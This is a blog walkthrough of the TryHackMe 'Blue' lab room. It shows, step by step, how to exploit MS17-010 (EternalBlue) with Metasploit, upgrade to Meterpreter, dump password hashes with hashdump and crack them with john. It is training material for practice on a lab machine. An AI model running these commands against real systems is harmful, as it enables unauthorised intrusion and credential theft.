@@ -1,0 +1,392 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta http-equiv=content-language content="en">
+<meta name=color-scheme content="light dark">
+<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
+<meta name=author content="Kiel Vaughn">
+<meta name=description content="Blue    Blue is the second room in the Offensive Security path on TryHackMe. Below is my walkthrough for the tasks for this room.
+Task 1 Hints  Have you deployed the machine and clicked on complete? What popular port scanner can be used to answer the 2nd and 3rd questions for this task?   Task 2 Hints  Follow the information mentioned and launch Metasploit How do you search for exploits in Metasploit?">
+<meta name=keywords content="blog,cybersecurity,personal">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Blue">
+<meta name=twitter:description content="Blue    Blue is the second room in the Offensive Security path on TryHackMe. Below is my walkthrough for the tasks for this room.
+Task 1 Hints  Have you deployed the machine and clicked on complete? What popular port scanner can be used to answer the 2nd and 3rd questions for this task?   Task 2 Hints  Follow the information mentioned and launch Metasploit How do you search for exploits in Metasploit?">
+<meta property="og:title" content="Blue">
+<meta property="og:description" content="Blue    Blue is the second room in the Offensive Security path on TryHackMe. Below is my walkthrough for the tasks for this room.
+Task 1 Hints  Have you deployed the machine and clicked on complete? What popular port scanner can be used to answer the 2nd and 3rd questions for this task?   Task 2 Hints  Follow the information mentioned and launch Metasploit How do you search for exploits in Metasploit?">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://www.kielvaughn.com/ctfs/2021-04-14-blue/"><meta property="article:section" content="ctfs">
+<meta property="article:published_time" content="2021-04-14T00:00:00+00:00">
+<meta property="article:modified_time" content="2021-04-14T00:00:00+00:00">
+<title>
+Blue · Kiel Vaughn, CISSP
+</title>
+<link rel=canonical href=http://www.kielvaughn.com/ctfs/2021-04-14-blue/>
+<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
+<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
+<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
+<link rel=apple-touch-icon href=/assets/img/cissp.ico>
+<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
+<meta name=generator content="Hugo 0.88.1">
+</head>
+<body class="preload-transitions colorscheme-dark">
+<main class=wrapper>
+<nav class=navigation>
+<section class=container>
+<a class=navigation-title href=/>
+Kiel Vaughn, CISSP
+</a>
+<input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle>
+<i class="fa fa-bars fa-fw" aria-hidden=true></i>
+</label>
+<ul class=navigation-list>
+<li class=navigation-item>
+<a class=navigation-link href=/whoami/>whoami</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/certifications/>certifications</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/posts/>blog</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
+</li>
+</ul>
+</section>
+</nav>
+<div class=content>
+<section class="container page">
+<article>
+<header>
+<h1 class=title>
+<a class=title-link href=http://www.kielvaughn.com/ctfs/2021-04-14-blue/>
+Blue
+</a>
+</h1>
+</header>
+<h1 id=blue>
+Blue
+<a class=heading-link href=#blue>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h1>
+<p>Blue is the second room in the Offensive Security path on TryHackMe. Below is my walkthrough for the tasks for this room.</p>
+<details><summary><strong>Task 1 Hints</strong></summary>
+<ul>
+<li>Have you deployed the machine and clicked on complete?
+<li>What popular port scanner can be used to answer the 2nd and 3rd questions for this task?
+</ul>
+</details>
+<details><summary><strong>Task 2 Hints</strong></summary>
+<ul>
+<li>Follow the information mentioned and launch Metasploit
+<li>How do you search for exploits in Metasploit?
+<li>What would you search for in this case?
+</ul>
+</details>
+<details><summary><strong>Task 3 Hints</strong></summary>
+<ul>
+<li>What post exploitation modules can be used to convert a TCP Shell to Meterpreter (Google it!)
+<li>Make sure you set the appropriate options!
+<li>Make sure your migrate step utilizes the correct system architecture.
+</ul>
+</details>
+<details><summary><strong>Task 4 Hints</strong></summary>
+<ul>
+<li>Two popular tools can be used to crack this password with a rather popular password list.
+<li>Make sure to indicate the correct hash format to crack the password.
+</ul>
+</details>
+<details><summary><strong>Task 5 Hints</strong></summary>
+<ul>
+<li>Follow the hints provided to uncover the 3 flags!
+</ul>
+</details>
+<h2 id=walkthrough>
+Walkthrough
+<a class=heading-link href=#walkthrough>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h2>
+<details><summary><strong>Full Walkthrough</strong></summary>
+<h3 id=task-1>
+Task 1
+<a class=heading-link href=#task-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1>
+Question 1
+<a class=heading-link href=#question-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>No answer is needed, just deploy the machine!</p>
+<h4 id=question-2>
+Question 2
+<a class=heading-link href=#question-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Blue1.png alt="Blue Task 1 Question 2"></p>
+<p>This can easily be answered by running:</p>
+<p><strong><code>threader3000</code></strong></p>
+<p>This will supply all of the open TCP ports on the box:</p>
+<p><img src=/assets/img/Blue2.png alt="Blue threader3000"></p>
+<p>Based on the results, the answer is 3 open ports (135, 139, 445).</p>
+<h4 id=question-3>
+Question 3
+<a class=heading-link href=#question-3>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Blue3.png alt="Blue Task 1 Question 3"></p>
+<p>Let&rsquo;s run nmap on this box with the following parameters:</p>
+<p><strong><code>nmap -p135,139,445 --script vuln &lt;victim ip></code></strong></p>
+<p>This will run the vuln script in nmap and return results based on vulnerabilities uncovered.</p>
+<p><img src=/assets/img/Blue6.png alt="Blue nmap vuln script"></p>
+<p>In the output above, you will see both the CVE for this vulnerability (<strong>CVE-2017-0143</strong>) and the name designation from Microsoft (<strong>ms17-010</strong>), which is the answer to this question.</p>
+<h3 id=task-2>
+Task 2
+<a class=heading-link href=#task-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1-1>
+Question 1
+<a class=heading-link href=#question-1-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>No answer needed, just launch Metasploit with:</p>
+<p><strong><code>msfconsole</code></strong></p>
+<h4 id=question-2-1>
+Question 2
+<a class=heading-link href=#question-2-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Blue7.png alt="Blue Task 2 Question 2"></p>
+<p>Once Metasploit has been launched, run the following to see all the exploits for the ms17-010 vulnerability:</p>
+<p><strong><code>search ms17-010</code></strong></p>
+<p>Several results will appear as shown below:</p>
+<p><img src=/assets/img/Blue8.png alt="Blue metasploit search ms17-010"></p>
+<p>The answer to this question is option 2 on this list <strong>exploit/windows/smb/ms17_010_eternalblue</strong>.</p>
+<h4 id=question-3-1>
+Question 3
+<a class=heading-link href=#question-3-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>The next question asks you which option needs to be set for this exploit:</p>
+<p><img src=/assets/img/Blue9.png alt="Blue Task 2 Question 3"></p>
+<p>This can be found by running the following within Metasploit:</p>
+<p><strong><code>show options</code></strong></p>
+<p><img src=/assets/img/Blue10.png alt="Blue metasploit show options"></p>
+<p>The answer is <strong>RHOSTS</strong> as that is the only option that is not set by default. Set RHOSTS by using:</p>
+<p><strong><code>set RHOSTS &lt;victim ip></code></strong></p>
+<p>and then set your LHOST to your VPN IP address by running the following:</p>
+<p><strong><code>set LHOSTS tun0</code></strong></p>
+<p><img src=/assets/img/Blue11.png alt="Blue metasploit set rhosts lhost"></p>
+<h4 id=question-4>
+Question 4
+<a class=heading-link href=#question-4>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>With this set, type in either:</p>
+<p><strong><code>run</code></strong> or <strong><code>exploit</code></strong></p>
+<p>You should see output similar to that shown below:</p>
+<p><img src=/assets/img/Blue12.png alt="Blue metasploit eternalblue exploit"></p>
+<h4 id=question-5>
+Question 5
+<a class=heading-link href=#question-5>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>No answer is needed for this task. This exploit doesn&rsquo;t work 100% of the time so it is letting you know you may have to reboot the VM and try again.</p>
+<h3 id=task-3>
+Task 3
+<a class=heading-link href=#task-3>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1-2>
+Question 1
+<a class=heading-link href=#question-1-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Blue14.png alt="Blue Task 3 Question 1"></p>
+<p>As mentioned above, background your shell with:</p>
+<p><strong><code>CTRL + Z</code></strong> and then answer <strong><code>y</code></strong> to the prompt to background your session.</p>
+<p><img src=/assets/img/Blue13.png alt="Blue metasploit background session 1"></p>
+<p>For the post exploitation module, I did some Googling on shell to meterpreter, and came across <a href=https://null-byte.wonderhowto.com/how-to/upgrade-normal-command-shell-metasploit-meterpreter-0166013/>this</a> article, which provides the answer to this question (<strong>post/multi/manage/shell_to_meterpreter</strong>).</p>
+<p><img src=/assets/img/Blue15.png alt="Blue metasploit post exploitation shell to meterpreter"></p>
+<h4 id=question-2-2>
+Question 2
+<a class=heading-link href=#question-2-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Blue16.png alt="Blue Task 3 Question 2"></p>
+<p>This next section asks you which option we&rsquo;re required to change. Let&rsquo;s run:</p>
+<p><strong><code>show options</code></strong> and you will notice a <strong>SESSION</strong> field.</p>
+<p><img src=/assets/img/Blue17.png alt="Blue metasploit shell to meterpreter show options"></p>
+<h4 id=question-3-2>
+Question 3
+<a class=heading-link href=#question-3-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>This needs to be modified to match the session number of your backgrounded session. Set this with:</p>
+<p><strong><code>set SESSION &lt;session #></code></strong></p>
+<p><img src=/assets/img/Blue19.png alt="Blue metasploit set session"></p>
+<p>Once done, use either:</p>
+<p><strong><code>run</code></strong></p>
+<p>or</p>
+<p><strong><code>exploit</code></strong></p>
+<p>to gain a Meterpreter shell.</p>
+<h4 id=question-4-1>
+Question 4
+<a class=heading-link href=#question-4-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>No answer needed, if this doesn&rsquo;t work, you might have to redo all of the prior steps in Metasploit.</p>
+<h4 id=question-5-1>
+Question 5
+<a class=heading-link href=#question-5-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>In order to know which session to select, run <strong>sessions -l</strong> to list all current active sessions in Metasploit.</p>
+<p><img src=/assets/img/Blue20.png alt="Blue metasploit list active sessions"></p>
+<p>You will notice 2 sessions: 1 with your reverse TCP shell, and another one with your Meterpreter shell. In this case, run the following to interact with the Meterpreter shell:</p>
+<p><strong><code>sessions -i 2</code></strong></p>
+<h4 id=question-6>
+Question 6
+<a class=heading-link href=#question-6>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>This question asks you to run:</p>
+<p><strong><code>shell</code></strong></p>
+<p>to launch a shell on the remote machine followed by:</p>
+<p><strong><code>whoami</code></strong></p>
+<p>to confirm you are the NT AUTHORITY\SYSTEM user.</p>
+<p><img src=/assets/img/Blue21.png alt="Blue metasploit interact with session"></p>
+<h4 id=question-7>
+Question 7
+<a class=heading-link href=#question-7>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>Next, let&rsquo;s background this shell with:</p>
+<p><strong><code>CTRL+Z</code></strong> followed by <strong><code>y</code></strong></p>
+<p>Next, run:</p>
+<p><strong><code>ps</code></strong></p>
+<p>to list processes running on the victim machine:</p>
+<p><img src=/assets/img/Blue23.png alt="Blue metasploit ps"></p>
+<h4 id=question-8>
+Question 8
+<a class=heading-link href=#question-8>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>We are looking for a service that can be migrated to that is running as NT AUTHORITY\SYSTEM to find a process that is running as this user (as the service we are utilizing likely is not). Be mindful that the architecture of the service would need to match that of your shell (x64 in this case). This may take a few attempts to migrate to a process as it may fail. Migration is attempted with:</p>
+<p><strong><code>migrate &lt;PID></code></strong></p>
+<p>where PID is the process ID listed in the first column of the list from the <strong>ps</strong> command. A successful migration (after a few attempts) is shown below:</p>
+<p><img src=/assets/img/Blue24.png alt="Blue metasploit migrate"></p>
+<h3 id=task-4>
+Task 4
+<a class=heading-link href=#task-4>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1-3>
+Question 1
+<a class=heading-link href=#question-1-3>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>Next, we&rsquo;re going to dump all the passwords on the victim machine. Follow the information provided in the question as shown below and run:</p>
+<p><strong><code>hashdump</code></strong></p>
+<p><img src=/assets/img/Blue25.png alt="Blue metasploit hashdump"></p>
+<p>You should see output similar to that shown below, and there is one non-default user listed in this case, <strong>Jon</strong>.</p>
+<p><img src=/assets/img/Blue26.png alt="Blue metasploit hashdump"></p>
+<h4 id=question-2-3>
+Question 2
+<a class=heading-link href=#question-2-3>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Blue27.png alt="Blue Task 4 Question 2"></p>
+<p>Let&rsquo;s crack this password with <strong>john</strong>. First, on your attacker machine, copy the full line with the Jon user listed and echo it into a file with:</p>
+<p><strong><code>echo Jon:1000:....::: > hashes</code></strong></p>
+<p>To echo the hash into the hashes file. Next, let&rsquo;s run:</p>
+<p><strong><code>john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=NT</code></strong></p>
+<p>This will attempt to crack the NT hash with the rockyou wordlist. After a couple minutes, the user&rsquo;s password will be displayed:</p>
+<p><img src=/assets/img/Blue28.png alt="Blue John"></p>
+<h3 id=task-5>
+Task 5
+<a class=heading-link href=#task-5>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1-4>
+Question 1
+<a class=heading-link href=#question-1-4>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>Let&rsquo;s connect to this machine with Remote Desktop with <strong>remmina</strong>. Fill in the IP address of your victim machine once launched along with the user (<strong>Jon</strong>) and his password you cracked in the previous question.</p>
+<p><img src=/assets/img/Blue29.png alt="Blue Remmina rdp"></p>
+<p>After a couple moments, you will be presented with Jon&rsquo;s desktop as shown below.</p>
+<p><img src=/assets/img/Blue30.png alt="Blue Remmina Windows Desktop"></p>
+<p>Let&rsquo;s start looking for flags.</p>
+<p><img src=/assets/img/Blue31.png alt="Blue Task 5 Question 1"></p>
+<p>On Windows, the root of the system is typically <strong>C:</strong>. Let&rsquo;s open File Explorer and look around:</p>
+<p><img src=/assets/img/Blue32.png alt="Blue flag1"></p>
+<p>The first flag is located here in the flag1.txt file.</p>
+<h4 id=question-2-4>
+Question 2
+<a class=heading-link href=#question-2-4>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Blue33.png alt="Blue Task 5 Question 2"></p>
+<p>This also provides a hint, this can be located at <strong>C:\Windows\System32\config</strong></p>
+<p><img src=/assets/img/Blue34.png alt="Blue flag2"></p>
+<h4 id=question-3-3>
+Question 3
+<a class=heading-link href=#question-3-3>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Blue35.png alt="Blue Task 5 Question 3"></p>
+<p>The final flag is located at <strong>C:\Users\Jon\My Documents</strong> (as Jon is an administrator).</p>
+<p><img src=/assets/img/Blue36.png alt="Blue flag3"></p>
+<p>That&rsquo;s it! All flags have been uncovered!</p>
+</details>
+</article>
+</section>
+</div>
+<footer class=footer>
+<section class=container>
+©
+2020 -
+2021
+Kiel Vaughn
+</section>
+</footer>
+</main>
+<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
+</body>
+</html>
